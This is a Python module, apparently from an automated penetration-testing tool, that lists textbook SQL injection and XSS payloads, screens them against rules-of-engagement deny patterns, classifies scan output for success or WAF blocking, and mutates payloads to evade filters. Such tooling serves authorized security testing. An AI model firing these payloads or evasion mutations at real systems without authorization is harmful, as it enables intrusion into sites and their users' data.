"""
Payload generation + reflection engine (Phase 6C).

Supports bounded payload candidate generation for SQLi and XSS,
preflight safety validation, semantic reflection classification, and mutation.
"""
from __future__ import annotations

from typing import Any


_SUPPORTED_VULN_CLASSES = {"sqli", "xss"}


def generate_payload_candidates(
    vuln_class: str,
    target: str,
    previous_payloads: list[str] | None = None,
    max_candidates: int = 4,
) -> list[dict[str, Any]]:
    vclass = str(vuln_class or "").strip().lower()
    max_c = max(1, int(max_candidates))
    previous = set(previous_payloads or [])

    if vclass == "sqli":
        base = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
        ]
    elif vclass == "xss":
        base = [
            "<script>alert(1)</script>",
            "\"><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
    else:
        return []

    out: list[dict[str, Any]] = []
    for p in base:
        if p in previous:
            continue
        out.append(
            {
                "payload": p,
                "risk_tag": "injection_candidate",
                "vuln_class": vclass,
                "rationale": f"Template candidate for {vclass} against {target}",
            }
        )
        if len(out) >= max_c:
            break
    return out


def preflight_validate_payload(
    payload: str,
    vuln_class: str,
    roe_disallow_patterns: list[str] | None = None,
) -> tuple[bool, str]:
    p = str(payload or "")
    if not p.strip():
        return False, "empty_payload"

    if str(vuln_class or "").lower() not in _SUPPORTED_VULN_CLASSES:
        return False, "unsupported_vuln_class"

    deny_patterns = [str(x).lower() for x in (roe_disallow_patterns or [])]
    low = p.lower()
    for patt in deny_patterns:
        if patt and patt in low:
            return False, f"denied_pattern:{patt}"

    # Basic payload entropy/length guardrail
    if len(p) > 300:
        return False, "payload_too_long"

    return True, "ok"


def classify_reflection_outcome(stdout: str, stderr: str, exit_code: int) -> str:
    s = f"{stdout}\n{stderr}".lower()
    if any(x in s for x in ["injection successful", "payload executed", "shell obtained", "xss confirmed"]):
        return "likely_success"
    if any(x in s for x in ["waf", "blocked", "forbidden", "403"]):
        return "likely_blocked_by_waf"
    if any(x in s for x in ["syntax error", "unterminated", "invalid query"]):
        return "syntax_mismatch"
    if any(x in s for x in ["no parameters", "no forms", "no injectable"]):
        return "no_attack_surface"
    if exit_code != 0:
        return "uncertain"
    return "uncertain"


def mutate_payload(payload: str, round_idx: int) -> str:
    p = str(payload or "")
    r = int(round_idx)
    if r % 3 == 0:
        return p.replace(" ", "/**/")
    if r % 3 == 1:
        return p.replace("'", "%27")
    return p.replace("<", "&lt;").replace(">", "&gt;")
